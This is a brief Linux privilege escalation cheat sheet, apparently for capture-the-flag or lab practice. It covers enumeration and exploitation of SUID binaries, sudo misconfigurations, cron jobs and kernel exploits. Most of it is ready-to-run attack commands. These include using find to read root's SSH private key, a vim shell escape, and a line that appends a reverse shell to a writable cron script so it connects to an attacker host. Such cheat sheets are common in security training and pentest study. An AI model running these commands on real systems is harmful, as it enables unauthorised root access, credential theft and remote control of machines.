# 🐧 Linux Privilege Escalation Guide

## Overview

Linux privilege escalation techniques to escalate from regular user to root.

---

## Phase 1: Enumeration

```bash
whoami
id
sudo -l
uname -a
cat /etc/os-release
```

## Phase 2: Identify Vectors

### SUID Binaries

```bash
find / -perm -4000 2>/dev/null
```

Common vulnerable SUID binaries:
- strings
- find
- nano
- vim
- less
- cp
- mv

### Sudo Misconfiguration

```bash
sudo -l

# Look for:
# (ALL) NOPASSWD: /bin/ls
# (ALL) /bin/find
```

### Cron Jobs

```bash
crontab -l
cat /etc/crontab
ls -la /etc/cron*
```

### Weak File Permissions

```bash
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /root
```

### Capabilities

```bash
getcap -r / 2>/dev/null
```

## Phase 3: Exploitation

### Sudo Abuse

```bash
sudo -i                     # If NOPASSWD
sudo /bin/bash              # Execute as root
```

### SUID Exploitation (find)

```bash
find / -name root -exec cat /root/.ssh/id_rsa \; -quit
```

### SUID Exploitation (vim)

```bash
vim
:!bash
```

### Cron Job Manipulation

If cron runs a script you can write:
```bash
echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" >> /path/to/script.sh
```

### Kernel Exploit

```bash
uname -r
searchsploit kernel
compile and run exploit
```

## Phase 4: Verification

```bash
whoami
id
cat /root/flag.txt
```

